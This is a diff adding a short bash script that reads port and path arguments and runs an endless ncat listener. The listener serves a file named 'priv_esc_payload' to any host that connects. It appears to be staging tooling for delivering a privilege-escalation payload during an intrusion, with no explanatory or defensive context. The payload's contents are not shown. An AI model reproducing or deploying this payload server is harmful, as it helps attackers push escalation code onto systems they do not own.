@@ -1,0 +1,13 @@
+#!/bin/bash
+
+for i in $@; do
+  if [ "$(expr $i : portr)" != "0" ]; then
+    portr=${i#*=}
+  elif [ "$(expr $i : path)" != "0" ]; then
+    path=${i#*=}
+  fi
+done
+
+while true; do
+  ncat -v -l -p $portr <$path/priv_esc_payload
+done
